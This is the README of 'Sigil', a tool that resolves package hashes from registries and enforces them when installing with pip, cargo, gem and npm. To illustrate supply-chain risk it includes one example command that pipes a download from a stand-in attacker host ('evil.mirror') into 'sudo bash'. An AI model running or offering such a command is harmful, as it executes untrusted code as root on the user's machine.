<div align="center">
<pre>
  ███████╗ ██╗  ██████╗ ██╗ ██╗
  ██╔════╝ ██║ ██╔════╝ ██║ ██║
  ███████╗ ██║ ██║  ███╗██║ ██║
  ╚════██║ ██║ ██║   ██║██║ ██║
  ███████║ ██║ ╚██████╔╝██║ ███████╗
  ╚══════╝ ╚═╝  ╚═════╝ ╚═╝ ╚══════╝

       seal your dependencies
       never install blind
</pre>
</div>

---

# Sigil

**Cryptographic integrity for every package. Zero-trust supply chain. Sub-millisecond.**

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.9%2B-3670A0)](https://python.org)
[![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)]()
[![Registries](https://img.shields.io/badge/registries-4-purple)]()

**Sigil** is a zero-dependency, cache-first cryptographic verifier for your package supply chain. Before any package touches your system, Sigil resolves its hash from the authoritative registry — then enforces that hash at install time. No hash match, no install. Ever.

## The Problem

Every `pip install`, `npm install`, `cargo install`, and `gem install` downloads arbitrary code from the internet and executes it. Most package managers don't verify cryptographic hashes by default. You're installing blind.

```
curl https://evil.mirror/package.tar.gz | sudo bash
```

This is not a joke. This is how supply chain attacks happen.

## How Sigil Works

```
  User                  Sigil                    Registry              Package Mgr
  ────                  ─────                    ────────              ───────────
    │                     │                         │                       │
    │ install pkg==1.0    │                         │                       │
    │────────────────────>│                         │                       │
    │                     │                         │                       │
    │                     │ GET /pkg/1.0/json       │                       │
    │                     │────────────────────────>│                       │
    │                     │                         │                       │
    │                     │                         │ {sha256: "abc123..."} │
    │                     │<────────────────────────│                       │
    │                     │                         │                       │
    │                     │ validate hash format    │                       │
    │                     │ cache with 24h TTL      │                       │
    │                     │                         │                       │
    │                     │ pip install --require-hashes ...                │
    │                     │────────────────────────────────────────────────>│
    │                     │                         │                       │
    │                     │         ✓ verified      │                       │
    │                     │<────────────────────────────────────────────────│
    │                     │                         │                       │
    │ ✓ installed         │                         │                       │
    │<────────────────────│                         │                       │
```

Every subsequent install of the same version: **0ms** (local cache hit).

## Registries

| Registry | Command | Hash Algorithm | Status |
|----------|---------|----------------|--------|
| **PyPI** (pip) | `sigil pip httpx==0.28.1` | SHA256 | ✅ inline via `--require-hashes` |
| **crates.io** (cargo) | `sigil cargo ripgrep==14.1.1` | SHA256 | ✅ pre-build verification |
| **RubyGems** (gem) | `sigil gem rake==13.2.1` | SHA256 | ✅ pre-install verification |
| **npm** (npx) | `sigil npm cowsay@1.6.0` | SRI (sha512) | ✅ pre-execution verification |

## Performance

| Scenario | Time | Notes |
|----------|------|-------|
| Cached lookup | **0ms** | Hash already in local cache |
| Cold lookup (parallel, 4 pkgs) | **~130ms** | Parallel API calls to registry |
| Full pip install (cached) | **~60ms** overhead | `--require-hashes` checks during pip's own download |

No network calls for cached packages. The cache TTLs at 24 hours — after that, Sigil re-verifies from the live registry to ensure freshness.

## Security

Sigil validates every byte that crosses the trust boundary:

- **Hash format validation** — Rejects anything that isn't a well-formed hash (no newlines, no shell metacharacters, no control characters)
- **Version sanitization** — Versions from registry APIs are validated before appearing in output
- **Package name sanitization** — Input names are checked for injection characters
- **Atomic cache writes** — `tempfile` + `fsync` + atomic rename; no cache corruption
- **Cache permissions** — `chmod 0o600` on files, `0o700` on directory
- **Graceful degradation** — API down? Falls back to cached hash with age warning. Schema change? Detected and flagged.

Full threat model in [SECURITY.md](SECURITY.md).

## Quick Start

```bash
# Install (stdlib only — zero dependencies)
curl -O https://raw.githubusercontent.com/johnpippett/sigil/main/sigil
chmod +x sigil

# Or clone
git clone https://github.com/johnpippett/sigil.git
cd sigil && chmod +x sigil

# Verify a package before installing
./sigil pip httpx==0.28.1

# Pipe directly to pip for enforced verification
pip install --require-hashes -r <(./sigil pip httpx==0.28.1 typer==0.16.0)

# Cargo
./sigil cargo ripgrep==14.1.1

# RubyGems
./sigil gem rake==13.2.1

# npm (verify before npx-style execution)
./sigil npm cowsay@1.6.0
```

## Hermes Agent Integration

Sigil ships as a skill for [Hermes Agent](https://github.com/NousResearch/hermes-agent). When loaded, every agent-initiated package install is automatically verified:

```bash
# Install the skill
cp SKILL.md ~/.hermes/skills/software-development/sigil/SKILL.md
cp sigil ~/.hermes/skills/software-development/sigil/scripts/pkg-hash-resolve
```

## Philosophy

**Never install blind.** If the hash doesn't match, the install is blocked. If no authoritative hash exists, the install is blocked. If the registry returns a hash that looks suspicious, the install is blocked.

Sigil errs on the side of not installing. Your supply chain is not a testing ground.

## License

MIT © John Pippett

---

*"Trust but verify" is for amateurs. "Verify or die" is for production.*
